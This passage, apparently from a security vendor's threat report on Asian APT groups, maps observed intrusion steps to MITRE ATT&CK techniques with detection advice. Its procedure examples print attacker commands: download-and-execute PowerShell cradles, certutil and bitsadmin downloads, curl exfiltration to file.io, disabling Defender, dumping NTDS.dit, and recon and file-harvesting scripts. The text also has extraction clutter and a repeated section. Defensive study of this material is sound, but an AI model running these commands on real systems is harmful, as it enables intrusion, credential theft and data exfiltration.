Windows Service Management\nService File Name: cmd /K start С:\\Windows\\setup\\winhost.exe\nService Type: user mode service\nService Start Type: auto start\nService Account: LocalSystem\n\n**Scheduled Task/Job: Scheduled Task T1053.005**\n\nTo run ransomware on other machines in the network, they created a scheduled task that started the malicious\nprogram. Command line within the ransomware:\n\nschtasks /create /tn lockertask /tr С:\\Windows\\btlc.exe /sc minute /mo 1 /F /ru system\n\nHere is an example log for ransomware started through the Task Scheduler:\n\nSource Name: Microsoft-Windows-TaskScheduler\nStrings: ['\\\\lockertask' '\\{511DD224-22C0-408A-8A3D-1F80AAAABD8C}']\nComputer Name: PC_NAME\nRecord Number: 136571\nEvent Level: 4\n\n\n-----\n\nFigure 26 Execution graph. TIP interface\n\n**Account Manipulation: SSH Authorized Keys T1098.004**\n\nCreating sessions and authorizing connections to command centers on behalf of users configured by the\nattackers.\n\n**Obfuscated Files or Information T1027**\n\nThe malicious files that were used during exploitation of VMware Horizon were packed by Themida to conceal\nthem from analysis.\n\n\n-----\n\nFigure 27 Warning\n\nAdditionally, most of the PowerShell commands used by the attackers were obfuscated:\n\n\nPowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden\n-EncodedCommand JAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagB…\n\n\n**Impair Defenses: Disable or Modify Tools T1562.001**\n\nThe attackers disabled Windows Defender Realtime Monitoring:\n\n\nPowerShell -exec bypass -command Get-MpPreference\nPowerShell -exec bypass -command Set-MpPreference -DisableRealtimeMonitoring $True\n\n\n-----\n\n**Network Share Connection Removal T1070.005**\n\nPrior to starting encryption of user files, the HolyGhost sample unmounted the connected network drives:\n\n\nnet use * /delete /y\n\n\n**OS Credential Dumping T1003**\n\nThe ProcDump tool was used to obtain account credentials from infected machines:\n\n\nContent Modification Time,REG,Registry Key__,[\\Software\\Sysinternals\\ProcDump] EulaAccepted:\n\n[REG_DWORD_LE] 1__,winreg/winreg_default,OS:/data/C/Windows/System32/config/DEFAULT,\n\nSource: SYSTEM\nС:\\Windows\\temp\\rar.exe\nС:\\Windows\\temp\\socks_x64.exe\nС:\\Windows\\temp\\plink.exe\nС:\\Windows\\temp\\svshost.exe\nС:\\Windows\\temp\\pd64.exe\nС:\\Windows\\temp\\mi.exe\nС:\\Windows\\temp\\svphost.exe\n\n\n**OS Credential Dumping: NTDS T1003.003**\n\nTo access the passwords of all users in the domain, the attackers dumped of ntds.dit:\n\n\nPowerShell ntdsutil.exe 'ac i ntds' 'ifm' 'create full С:\\Windows\\temp\\ztemp' q q\n\n\n**Network Service Discovery T1046**\n\nTo detect open ports on machines in the network, the attackers used custom PowerShell scripts and ran them\non the systems:\n\n\n& {. С:\\Windows\\temp\\1.ps1; Invoke-PortCheck -network 10.0.48 -port 22,80,445,443,3389,8080 }\n\n\n-----\n\nThey also used popular software for identifying subnets, IP addresses, services, users, shared resources, and\nother relevant information: Advanced IP Scanner, Sysinternals Tools, and others:\n\nC:\\Users\\USERNAME\\appdata\\local\\temp\\29\\advanced ip scanner 2\\advanced_ip_scanner.exe\n\n**System Information Discovery T1082**\n\nCollecting information from systems, resources, and applications.\n\nsysteminfo\n\n**System Network Connections Discovery T1049**\n\nObtaining information from network connections to identify active services.\n\nnetstat -nato\nipconfig /all\nnslookup MACHINE_DOMAIN_NAME\n\n**Remote System Discovery T1018**\n\nSearching for systems in the network\n\nping DOMAIN_NAME_1 -n 2\nping DOMAIN_NAME_2\n\n**Remote System Discovery T1018**\n\nTo move laterally through the network, the attackers used RDP and other services to connect to Windows\nmachines, and used SSH to connect to Linux servers. Compromised accounts were used for connections.\n\n\n-----\n\nExample of reconnaissance on remote hosts using smbexec:\n\n\nService Name: BTOBTO\nService File Name: %COMSPEC% /Q /c echo route print > \\\\127.0.0.1\\C$__output 2>^&1 > %TEMP%\\\nexecute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat\nService Type: user mode service\nService Start Type: demand start\nService Account: LocalSystem\n\nService Name: BTOBTO\nService File Name: %COMSPEC% /Q /c echo cd > \\\\127.0.0.1\\C$__output 2>^&1 > %TEMP%\\execute.\nbat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat\nService Type: user mode service\nService Start Type: demand start\nService Account: LocalSystem\n\n\nThe PuTTY tool was used to connect over SSH.\n\n\nDEFAULT,Software\\SimonTatham\\PuTTY\\SshHostKeys\\ssh_\nSOURCE_IP@443:IP_1\nSOURCE_IP@9223:IP_2\nSOURCE_IP@22:IP_3\nSOURCE_IP@22:IP_4\n\n\n**Ingress Tool Transfer T1105**\n\nPowerShell was used to transfer tools between hosts.\n\n\nIEX ((new-object net.webclient).downloadstring('http://DOMAIN_NAME/cdyujhs.jpg'))\n\n(New-Object System.Net.WebClient).DownloadFile('http://DOMAIN_NAME/ugly.exe', 'С:\\Windows\\\nccalc.exe');Start-Process -Filepath 'С:\\Windows\\ccalc.exe'\n\n$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile\n+= '.bat'; $wc.DownloadFile('http://DOMAIN_NAMEDOMAIN_NAME/kill.bat', $tempfile); & $tempfile\n\n_PowerShell.exe -nop -c IEX ((new-object net.webclient).downloadstring('http://DOMAIN_NAME/\nvmware/horizon/r347876.php?p=DOMAIN_NAME'))_\n\n[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';(New-Object Net.WebClient).\nDownloadFile('DOMAIN_NAME','C:\\ProgramData\\pscp.exe')\n\n\n-----\n\n**Resource Hijacking T1496**\n\nExploitation of the vulnerability in VMware Horizon allowed the attackers to install the XMRIG cryptocurrency\nminer to a system.\n\nPowerShell -Command [Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-\nObject System.Net.WebClient; $wc.DownloadFile('DOMAIN_NAME', 'С:\\Windows\\system32\\config\\\nsystemprofile\\xmrig.zip')\n\nPowerShell -Command Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.\nIO.Compression.ZipFile]::ExtractToDirectory('С:\\Windows\\system32\\config\\systemprofile\\xmrig.zip',\n'С:\\Windows\\system32\\config\\systemprofile\\mimu6')\n\n**Data Encrypted for Impact T1486**\n\nHolyGhost was used to encrypt user data. This malware was written in Go and contains functions for detecting\nexecution within a virtual environment, disabling user shares, and creating and deleting the service that is used\nto run this malware. HolyGhost can create scheduled tasks on machines in the network for the purpose of\nencrypting other machines. The public key used for encryption is obtained from the C2 server over HTTP.\n\n\n-----\n\nIn this incident, the attackers used port 8888, which User files are encrypted using the AES algorithm.\nis a non-standard port for HTTP (Non-Standard\nPort T1571): http://IP:8888\n\nFigure 29 Function for obtaining a key\n\nFigure 28 List of functions\n\nStarting a service:\n\nschtasks /create /tn lockertask /tr С:\\Windows\\btlc.exe /sc minute /mo 1 /F /ru system\n\n\n-----\n\nFigure 30 Instructions for decrypting files: FOR_DECRYPT.html\n\nAll encrypted files are saved with this name format: <name in Base64>.h0lyenc\n\n###### Summary\n\nAside from the fact that the APT group Dark Seoul used HolyGhost ransomware in the analyzed attack, the\ngroup employed standard techniques. The attackers' successful use of these techniques to achieve their goals\nmay indicate that the group chooses its victims based on the level of security of their infrastructure.\n\nDownload techniques in JSON format for MITRE Navigator:\n\n\n[Learn more](https://box.kaspersky.com/f/eb7966b1fa774ea9ad89/?dl=1)\n\n\n-----\n\nFigure 31 Threat Landscape page interface in TIP\n\n\n-----\n\n##### Summary of the examined incidents\n\nAfter studying the first part of the report titled \"Incidents with Asian APTs in different parts of the world,\"\nseveral conclusions can be drawn. Firstly, the victims of these attacks are spread worldwide, making it\nchallenging to pinpoint any specific region that is more frequently targeted. This suggests that the attackers\nutilize the same tactics in different parts of the world, indicating their ability to employ a uniform arsenal for\nvarious victims.\n\nAn important characteristic of these attackers is their utilization of a combination of techniques, namely\nCreate or Modify System Process: Windows technique Service T1543.003, along with Hijack Execution Flow:\nDLL Side-Loading T1574.002. This combination seems to be a signature move for Asian groups.\n\nThe primary objective of these Asian groups is cyber espionage, where they gather sensitive data and then\nexfiltrate it to legitimate cloud services or external resources. However, rare scenarios, as described in incident\nNo. 5, deviate from this norm.\n\nThe following statistics detail the detected Tactics, Techniques, and Procedures (TTPs) in the incidents\nstudied. In the subsequent part of the report, titled \"Technical Details,\" we will examine the most commonly\nemployed techniques by Asian APT groups, as identified from various incidents worldwide.\n\n###### Top 20 techniques used in reported incidents\n\nSystem Network Configuration Discovery 5\n\nMasquerading 4\n\nOS Credential Dumping 4\n\nRemote System Discovery 4\n\nSystem Information Discovery 4\n\nSystem Network Connections Discovery 4\n\nIngress Tool Transfer 4\n\nCommand and Scripting Interpreter 3\n\nScheduled Task/Job 3\n\nSystem Services 3\n\nCreate or Modify System Process 3\n\nEvent Triggered Execution 3\n\nHijack Execution Flow 3\n\nIndicator Removal 3\n\nArchive Collected Data 3\n\nExfiltration Over C2 Channel 3\n\nRemote Services 3\n\n\n-----\n\n### Technical  details\n\nThis section provides a detailed technical description of most TTPs that we detected from Asian APT groups.\nEach described technique consists of the following subsections:\n\n###### Basic description\n\nDescription of technique implementation.\n\n###### Examples of procedures\n\nExamples of detected uses of the technique by Asian APT groups.\n\n###### Detection\n\nApproaches employed to detect the technique, as well as the EventIDs of events in various monitoring agents\nthat can be used for detection.\n\nExample:\n\n###### Event source Log Event ID\n\nWindows System 7045\n\nWindows Security 4688\n\nSysmon Sysmon 1, 13\n\n###### SIGMA rules\n\nList of SIGMA rules related to this technique. The actual SIGMA rules can be found in the SIGMA section.\n\n- Sigma-Generic-Anomaly in the Windows Critical Process Tree\n\n- Sigma-Generic-Svchost.exe Start with no Standard Parameters\n\n- Sigma-Generic-Shell Creation by Critical Windows Process\n\n\n-----\n\n##### Initial Access TA0001\n\n###### Exploit Public-Facing Application T1190\n\n Basic description\n\nThe technique known as Exploit Public-Facing Application T1190 (exploitation of vulnerabilities in publicly\navailable applications) involves attackers’ attempts to exploit vulnerabilities in applications that are accessible\nover the internet. These applications may include websites, web services, and other applications that are\naccessible via open ports and protocols.\n\nAPT actors may use various tools to search for vulnerabilities in publicly available applications, including\nvulnerability scanners, which are specialized programs that automatically search for vulnerabilities. They can\nalso manually check applications for vulnerabilities.\n\nWhen a vulnerability is detected, attackers may exploit it to perform various actions, including hacking the\nsystem, stealing sensitive data, and installing malicious programs.\n\nFor example, they may exploit a vulnerability in a web application to perform SQL injections, which will allow\nthem to access a database and steal confidential data. They may also exploit vulnerabilities in web servers to\nremotely execute code and install malware on a server.\n\nVulnerabilities are most often found in web applications, mail services, remote administration tools, and similar\ntypes of resources.\n\n###### Examples of procedures\n\nIn addition to phishing, Asian APT groups often exploit vulnerabilities to gain initial access to the systems of\ntheir victims.\n\nBy analyzing the exploitation of vulnerabilities using network sensors, we discovered that Asian APT groups\nare attempting to exploit most of the known vulnerabilities, including those already known for a while as well as\nrecently detected vulnerabilities.\n\n**Microsoft Exchange Server vulnerabilities being exploited:**\n\n   - CVE-2021-34473, CVE-2021-34523, CVE-2021-31207 (ProxyShell)\n\n   - CVE-2021-26857, CVE-2021-26855, CVE-2021-26858, CVE-2021-27065 (ProxyLogon)\n\n   - CVE-2022-41040, CVE-2022-41082 (Proxynotshell)\n\n\n-----\n\n**Web application vulnerabilities being exploited:**\n\n- CVE-2022-34305 (Apache TomCat)\n\n- CVE-2021-44228 (Apache Log4j), CVE-2022-22965, CVE-2022-22963 (Spring4shell)\n\n- CVE-2020-17530, CVE-2021-31805 (Apache Struts)\n\n- VMware Horizon\n\n- CVE-2021-26084, CVE-2022-26138 (Atlassian Confluence server and data center)\n\n- GitLab CE/EE\n\n- CVE-2019-19781 (Citrix ADC)\n\n- CVE-2020-2551 (Oracle WebLogic Server)\n\n**Network vulnerabilities being exploited:**\n\n- CVE-2019-0708 (BlueKeep)\n\n- CVE-2017-0144 (EternalBlue)\n\nWe have listed only a few of them here. In addition to vulnerability exploits, a large number of brute-force\nattacks on network services were also detected.\n\nFor example, while investigating an attack on an Argentinian company, our GERT team found that the APT\ngroup known as Dark Seoul exploited the CVE-2021-44228 (Log4Shell) vulnerability in a VMware Horizon server.\nExploitation of this vulnerability provides the capability to remotely execute code on a server.\n\nAnother GERT investigation related to an Asian group revealed an exploit of the CVE-2021-26855 ProxyLogon\nvulnerability. The ProxyLogon exploit can allow an attacker to bypass the authentication mechanism in MS\nExchange and pose as any user.\n\nResearchers also describe cases when APT groups used zero-day vulnerabilities to attack organizations in\nRussia. One example is the group known as HAFNIUM.\n\nBelow are statistics from our network sensors on vulnerability exploitation from Asian IP addresses. We\nunderstand that many groups use various VPN/Proxy/VPS to conduct attacks and gain initial access. For\nexample, the well-known APT group HAFNIUM uses American VPS in its attacks. Nonetheless, the presented\nstatistics can still help illustrate the vulnerabilities that are exploited from Asian addresses:\n\n\n-----\n\n###### CVE Count\n\nExploit.CVE-2021-35394.UDP.C&C 77%\n\nExploit.CVE-2021-44228.TCP.C&C 6%\n\nExploit.CVE-2021-44228.HTTP.C&C 5%\n\nExploit.CVE-2020-2551.TCP.C&C 3%\n\nExploit.CVE-2019-16759.TCP.ServerRequest 2%\n\nExploit.CVE-2018-11776.HTTP.C&C 2%\n\nExploit.CVE-2017-18368.HTTP.C&C 2%\n\nExploit.CVE-2022-26134.HTTP.C&C 1%\n\nExploit.CVE-2019-0708.HTTP.C&C 1%\n\nExploit.CVE-2017-5638.HTTP.C&C 1%\n\n###### Detection\n\nThis technique is difficult to detect because there is always a potential for exploitation of a zero-day\nvulnerability of a publicly accessible application. Also, the exploit is performed from the external host of the\nactor, and we are only able to detect artifacts of compromise after the attack has already occurred. Therefore,\ndetection of this technique will rely on perimeter security tools such as IPS/IDS and FW/NGFW, and on WAFtype application security tools.\n\nYou can reduce the risks of this technique being exploited by performing regular updates of all frameworks,\napplications, and operating system components that are in use. You should also use network security tools and\nweb firewalls, configure an audit of web components, implement network segmentation of the infrastructure,\nand perform regular security audits to verify that no unnecessary services or ports are accessible from the\noutside.\n\n\n-----\n\n###### Phishing T1566\n\n Basic description\n\nPhishing T1566 is the MITRE ATT&CK classification for a technique that uses fraudulent emails, messages, or\nwebsites to deceive people into revealing sensitive information such as passwords, credit card details, or other\npersonal information. This technique is aimed at exploiting the users’ innatention to pressure them to perform\ncertain actions that will benefit the threat actor.\n\nPhishing attacks are usually conducted in a variety of different ways, including through email, instant\nmessaging platforms, social networks, and even phone calls. Attackers often pretend to be from legitimate\norganizations, such as banks, service providers, or other well-known companies to gain the trust of their\nvictims.\n\nDuring a phishing attack,the victim is often persuaded to click malicious links or open malicious attachments,\nwhich could lead to several different outcomes. They may install malware on the victim's device, steal account\ncredentials for logging in to a system, or redirect the victim to fraudulent websites where the victim will\nunwittingly enter sensitive information.\n\n\n-----\n\n###### Basic description\n\nThe Phishing T1566 technique in the MITRE ATT&CK Matrix involves attacks in which threat actors send emails\nor messages that deceive users into providing their account credentials or performing actions that may\ncompromise the system or network. This technique uses social engineering, which is aimed at tricking a person\ninto revealing sensitive information.\n\n###### Examples of procedures\n\n**Example 1**\n\nOur experts from Kaspersky’s ICS CERT detected a new campaign launched by the group known as DexCone\nthat targets a multitude of state-owned companies in Russia, Ukraine, Belarus, and Armenia.\n\nThe attackers gained initial access through bulk phishing emails sent under the guisefrom government\nregulators. The malicious attachments in those emails were self-extracting archives containing an office\ndocument and a malicious executable file.\n\nFigure 32 Contents of a self-extracting archive\n\nWhen the phishing attachment is run, a malicious MSI package is installed and this package creates a service\nfor communicating with the C2 servers of the attackers.\n\n\n###### Phishing: Spearphishing Attachment T1566.001\n\n Basic description\n\nThe Phishing T1566 technique in the MITRE ATT&CK Matrix involves attacks in which threat actors send emails\nor messages that deceive users into providing their account credentials or performing actions that may\ncompromise the system or network. This technique uses social engineering, which is aimed at tricking a person\ninto revealing sensitive information.\n\n###### Examples of procedures\n\n**Example 1**\n\nOur experts from Kaspersky’s ICS CERT detected a new campaign launched by the group known as DexCone\nthat targets a multitude of state-owned companies in Russia, Ukraine, Belarus, and Armenia.\n\nThe attackers gained initial access through bulk phishing emails sent under the guisefrom government\nregulators. The malicious attachments in those emails were self-extracting archives containing an office\ndocument and a malicious executable file.\n\nFigure 32 Contents of a self-extracting archive\n\nWhen the phishing attachment is run, a malicious MSI package is installed and this package creates a service\nfor communicating with the C2 servers of the attackers.\n\n\n-----\n\nFigure 33 Contents of a self-extracting archive\n\nDOCX Open Bait document\n\nC2\n\nUser Connections\nexecution MSI Install\n\nPhishing Malicious\n\nConnections\n\n###### SFX\nemail service C2\n\nExecute\n\nEXE\n\n**Reference information:**\n\nDexCone is an APT group that has been activeat least since 2018 and has engaged in phishing attacks\ntargeting banks in various countries all over the world, including Russia, Kazakhstan, Ukraine, Mexico, and many\nothers.\n\nDexCone employed various social engineering techniques, including phishing emails that contained malicious\nattachments or links to fake websites. When a user reached this type of website and entered their account\ncredentials, the attackers gained access to the user's bank account and were able to conduct financial\ntransactions without the user's knowledge.\n\nThe DexCone group employed a variety of methods for bypassing security systems, including fake certificates\nand various encryption technologies. They also used proxy servers to conceal their real IP address and\nlocation.\n\nAttacks by the DexCone group brought significant losses to banks and their customers, and this group\nbecame known as masters of phishing. Since 2021, experts from our Global Research and Analysis Team\n(GReAT) have detected use of the Pangolin* Trojan by attackers from ZexCone, which is the threat actor\nbehind the groups known as ExCone and DexCone.\n\n*** Pangolin is a Trojan that was detected in 2019 and used for cyber-espionage and theft of sensitive**\ninformation. It was aptly named after the mammal that is known for its ability to conceal itself from danger.\n\n7\n\nAPT trends\n\n\n[Learn more](https://securelist.com/apt-trends-report-q2-2022/106995/)\n\n\n-----\n\nPangolin is spread through phishing emails and malicious websites that may be specially created for this\npurpose. When victims visit this type of website or open a malicious attachment in an email, Pangolin begins\nits dirty work by installing malware on the victim's computer and thereby gaining access to its sensitive\ninformation.\n\nPangolin has several functions that make it especially dangerous. It can capture data that is entered through\nthe victim's keyboard, including usernames and passwords. It can also copy files, take screenshots, and\nintercept conversations in social networks. Pangolin can also install other malware to the victim's computer\nopening a path for additional attack vectors.\n\nAccording to some data, Pangolin may be linked to the threat group known as APT27 (aka Emissary Panda),\nwhich specializes in cyber-espionage and cyberattacks targeting governments and companies in various\ncountries throughout the world. However, this connection is not yet confirmed, and other groups may also\nuse Pangolin in their attacks. In any case, the distribution model for this Trojan is still private, and in 2021 we\nobserved the exclusive use of a new modified version by attackers from ZexCone.\n\n**Example 2**\n\nWe also detected a phishing campaign that targeted various clients but used similar malicious attachments\nwith identical functions. The attackers sent their victims archives containing malicious executable files whose\nnames ended with PDF so that the victim would think it was a real document and open the file.\n\nFigure 34 Phishing email\n\n\n-----\n\nAfter the malicious file named paymentSlip.pdf.exe was run on the victim's computer, several files were\nsaved to shared directories. Then the attackers ran PowerShell and added these files to the MS Windows\nDefender exclusions list.\n\n\"$windir\\$system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" Add-MpPreference -ExclusionPath\n\"$user\\$appdata\\aPCyDwLsApDgb.exe\" (MITRE: T1562.001 Impair Defenses: Disable or Modify Tools).\n\nAfter that, they used the standard tool named schtasks.exe to create scheduled tasks, and one of the files\npreviously dropped onto the computer served as the configuration file for these tasks.\n\n\"$windir\\$system32\\schtasks.exe\" /Create /TN \"Updates\\aPCyDwLsApDgb\" /XML\n\"$user\\$temp\\tmp8ACB.tmp\" (MITRE: T1053.005 Scheduled Task/Job: Scheduled Task).\n\n\n-----\n\nExample launch of malware in Kaspersky Sandbox:\n\nFigure 35 Illustration of an Execution Graph in TIP\n\n\n-----\n\n**Example 3**\n\nAnother similar example of a phishing email. The email contains two attached archives:\n\nFigure 36 Phishing email\n\nWhen 25th April_PDF.exe is run, it uses PowerShell to change the configuration of Windows Defender:\n\n\n\"$windir\\$system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" Add-MpPreference -ExclusionPath\n\"$selfpath\\$selfname.exe\" (MITRE: T1562.001 Impair Defenses: Disable or Modify Tools).\n\n\nThen it creates a task in the scheduler to achieve persistence:\n\n\n\"$windir\\$system32\\schtasks.exe\" /Create /TN \"Updates\\htOTEVF\" /XML \"$user\\$temp\\tmp56EA.\ntmp\" (MITRE: T1053.005 Scheduled Task/Job: Scheduled Task).\n\n\n-----\n\nFigure 37 Illustration of an Execution Graph in TIP\n\nThe 24th April_PDF.exe sample also adds itself to Windows Defender exclusions, then gathers account\ncredentials from browsers:\n\n\n-----\n\nFigure 38 Illustration of an Execution Graph in TIP\n\n\n-----\n\nFigure 39 Attack scenario\n\nDropped\n\nEXE\n\nStar\n\nExclude\n\npower\n\nmalware\n\nshell\n\nAttachment Contains Masquerading extension\n\nPDF EXE\n\nPhishing\nemail RAR EXE\n\nDropped\n\nTMP\n\nImporing\ntask\n\nCreate\nscheduled\ntask\n\n###### Detection\n\nThe following approaches are used to detect phishing:\n\n- Deployment of Secure Email Gateway solutions with dynamic technologies (sandbox) for scanning\nattachments in emails\n\n- Analyzing web traffic and identifying suspicious websites that may be linked to phishing attacks by means of\nmalware detection and monitoring systems\n\n- Giving users the capability to report suspicious emails or websites that they believe are phishing. This may\nhelp to quickly detect and block new phishing campaigns\n\n- Monitoring of user activity, such as clicks on links or input of personal information, to identify anomalous\nbehavior that may indicate a phishing attack\n\n- Regular update of software, including anti-virus and anti-phishing applications, to ensure protection against\nnew and unknown threats\n\n\n-----\n\nYou can also create correlation rules that may indirectly indicate a phishing campaign based on the following\nevents:\n\n   - Creation or execution of files with a double extension, such as document.pdf.exe or document.docx.exe\n\n   - Execution of self-extracting archives\n\n   - Start of a command shell from a trusted process, such as Winword.exe\n\n###### SIGMA rules\n\n   - Sigma-Generic-Shell Creation by Trusted Process\n\n   - Sigma-Generic-Drop and execution file from a trusted process\n\n   - Sigma-Generic-LNK Creation from Archive\n\n\n-----\n\n##### Execution TA0002\n\n###### Command and Scripting Interpreter T1059\n\n Basic description\n\nCommand and Scripting Interpreter T1059 is a technique in which attackers run commands, scripts, and\nexecutable files on their victim's system. This technique may include the use of Windows CMD, PowerShell,\nUnix Shell, JavaScript, VBScript, Python, Bash, and many others.\n\nA command shell is the main tool used by the attackers to interact with local and remote systems. There is\na very broad spectrum of actions that can be performed with cmd.exe. After gaining access to a command\nshell, actors can conduct reconnaissance of the current user and running processes and services. They can\nalso check access to groups, probe open network connections, and much more. Attackers can also use CMD\nto entrench themselves in the system, for example, by creating a service with the sc.exe create command\nor by adding a malicious payload to the registry using reg.exe. Attackers use command line utilities to disable\nsecurity mechanisms and move around the network. To automate their activities, various groups create scripts\nfor operations such as discovery, persistence, data collection and exfiltration.\n\n\n-----\n\n###### Command and Scripting Interpreter: Windows Command Shell T1059.003\n\n\n###### Basic description\n\nAPT actors often execute their commands from Windows CMD, which lets them manage many system\ncomponents. A command-line session can be obtained remotely. Therefore, attackers frequently embed\ncommands into their initial payload that is delivered as Microsoft Office documents. They also embed\ncommands into the second-stage payload that is downloaded from the command center and into RAT\nprograms.\n\nTo execute multiple commands using CMD, they can use batch files (with the BAT or CMD extension) to\ncreate scripts automating repetitive operations. These files provide sequential execution of commands using\nalgorithmic structures such as conditional operators and loops.\n\nSeeing as how cmd.exe is employed by attackers in a large number of cases and overlaps with other\ntechniques of the MITRE ATT&CK matrix, here we will examine only a few examples of cmd.exe use at different\nstages of an attack without delving too deep into the details of each example. We give a detailed breakdown of\nthe mentioned procedures in their corresponding techniques.\n\n###### Examples of procedures\n\n**Example 1**\n\nLateral Tool Transfer via SMB. Attackers use the copy command to copy the contents of the current folder to\na remote host (the copied files contain the tools and malware that the attacker needs):\n\n\n$system32\\cmd.exe /C copy * \\\\<remote_ip>\\C$\\windows\\help\\help\n\n\n-----\n\n**Example 2**\n\nAfter gaining access to the system, the attackers conduct reconnaissance. Similar to the procedures in the\ndescribed incidents, the operator executes reconnaissance commands from cmd.exe:\n\ncmd.exe /C netstat -ano\ncmd.exe /C systeminfo\ncmd.exe /C whoami\ncmd.exe /C net view \\\\<hostname>\ncmd.exe /C tasklist /v\ncmd.exe /C arp -a\ncmd.exe /C net use\ncmd.exe /C ping <host> -n <count>\ncmd.exe /C net user <username> /dom\ncmd.exe /C net group “domain admins” /dom\ncmd.exe /C echo list volume | diskpart\n\n**Example 3**\n\nAttackers use cmd.exe to run their malware:\n\ncmd /c $system32\\conhost64.exe\n\n**Example 4**\n\nAttackers use cmd.exe to download the tools that they will use in subsequent stages of an attack to the\ncompromised system:\n\ncmd.exe /c bitsadmin /transfer n hxxp://8.210.141[.]104:8099/1.txt $public\\Downloads\\1.txt\ncmd.exe /c certutil -urlcache -split -f hxxp://8.210.141[.]104:8099/MEUpdate.exe\n$windir\\Help\\Help\\MEUpdate.exe\n\n\n-----\n\n**Example 5**\n\nOperators exfiltrate the collected data to an external service:\n\n\ncmd.exe /C curl -F \"file=@$selfpath\\1.rar\" --ssl-no-revoke https://file.io\n\n\n**Example 6**\n\nAttackers employ their own batch scripts to perform repetitive actions on a local host and remote ones. Here\nis a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6):\n\nFigure 40 Script fragment\n\n\n-----\n\nThe script gathers data on the system and saves this data to files, then adds them to an archive. Here are all\nthe reconnaissance commands employed in the script:\n\n\nver >> С:\\Windows\\Web\\systeminfo.txtbb\ntime /t >> С:\\Windows\\Web\\systeminfo.txtbb\ndate /t >> С:\\Windows\\Web\\systeminfo.txtbb\nhostname >> С:\\Windows\\Web\\systeminfo.txtbb\nsysteminfo >> С:\\Windows\\Web\\systeminfo.txtbb\nnet localgroup Administrators >> С:\\Windows\\Web\\systeminfo.txtbb\nipconfig /all >> С:\\Windows\\Web\\systeminfo.txtbb\ntasklist /v >> С:\\Windows\\Web\\systeminfo.txtbb\ntasklist -svc >> С:\\Windows\\Web\\systeminfo.txtbb\nnet start >> С:\\Windows\\Web\\systeminfo.txtbb\nping www.yandex.ru >> С:\\Windows\\Web\\systeminfo.txtbb\ntracert -h 5 www.yandex.ru >> С:\\Windows\\Web\\systeminfo.txtbb\nnetstat -aon >> С:\\Windows\\Web\\systeminfo.txtbb\nnetstat -bv >> С:\\Windows\\Web\\systeminfo.txtbb\nnet use >> С:\\Windows\\Web\\systeminfo.txtbb\nnet share >> С:\\Windows\\Web\\systeminfo.txtbb\nnet view >> С:\\Windows\\Web\\systeminfo.txtbb\nnet view /domain >> С:\\Windows\\Web\\systeminfo.txtbb\nnet group /domain >> С:\\Windows\\Web\\systeminfo.txtbb\nnet user >> С:\\Windows\\Web\\systeminfo.txtbb\nnet user /domain >> С:\\Windows\\Web\\systeminfo.txtbb\nnet group \"domain controllers\" /domain >> С:\\Windows\\Web\\systeminfo.txtbb\nnet group \"domain admins\" /domain >> С:\\Windows\\Web\\systeminfo.txtbb\nnet group \"domain computers\" /domain >> С:\\Windows\\Web\\systeminfo.txtbb\nnltest /domain_trusts >> С:\\Windows\\Web\\systeminfo.txtbb\nroute print >> С:\\Windows\\Web\\systeminfo.txtbb\narp -a >> С:\\Windows\\Web\\systeminfo.txtbb\ndir /a \"c:\\program files\\*.*\" >> С:\\Windows\\Web\\systeminfo.txtbb\ndir /a \"c:\\Program Files (x86)\\*.*\" >> С:\\Windows\\Web\\systeminfo.txtbb\nreg query \"hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" >> С:\\Windows\\Web\\\nsysteminfo.txtbb\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR >> С:\\Windows\\\nWeb\\systeminfo.txtbb\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\DeviceClasses\\{53f56307b6bf-11d0-94f2-00a0c91efb8b} >> С:\\Windows\\Web\\reglist.txtbb\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USB >> С:\\Windows\\Web\\\nreglist.txtbb\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR >> С:\\Windows\\\nWeb\\reglist.txtbb\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\UsbFlags >> С:\\Windows\\\nWeb\\reglist.txtbb\nreg query HKLM [/s] >> С:\\Windows\\Web\\reglist.txtbb\nreg query HKCU [/s] >> С:\\Windows\\Web\\reglist.txtbb\n\n\n-----\n\n**Example 7**\n\nExample of a batch script for data collection and archiving:\n\n\n@echo off\ncmd /c \"mkdir C:\\Users\\public\\tmp\"\nPowerShell.exe \"dir C:\\Users -File -Recurse -Include '*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx' | where\nLastWriteTime -gt (Get-date).AddDays(-8) | copy-item -Destination C:\\Users\\public\\tmp -Force\n-ErrorAction SilentlyContinue\"\nC:\"\\Program Files\\\"WinRAR\\rar.exe a -v200m \"C:\\Users\\public\\tmp.rar\" \"C:\\Users\\public\\tmp\" -ep\nrmdir /s /q C:\\Users\\public\\tmp\nexit\n\n\nThe script performs a search for documents in user directories that were modified during the past 8 days,\ncopies the found files to a temporary directory, then archives it and deletes the copies. This script was run as a\nscheduled task.\n\n###### Detection\n\nDespite its popularity among threat actors, CMD is also used by system administrators for legitimate\npurposes. The line between malicious activity and legitimate activity can appear quite fuzzy in this case, so one\nof the ways to detect malicious activity is to track specific usage scenarios of cmd.exe, such as the following:\n\n\nArchiving\n\n###### 6\n\nCommand-line obfuscation\npatterns\n\n\nDownloading files from an\nexternal network\n\n###### 4\n\nUploading files to a remote\nserver\n\n\nSearching based on a template\nusing “*”\n\n###### 5\n\nRunning reconnaissance\ncommands\n\n\n###### ... 7\n\n\nRunning cmd.exe from nonstandard processes\n\n\nand many others\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows System 4688\n\nSysmon Sysmon 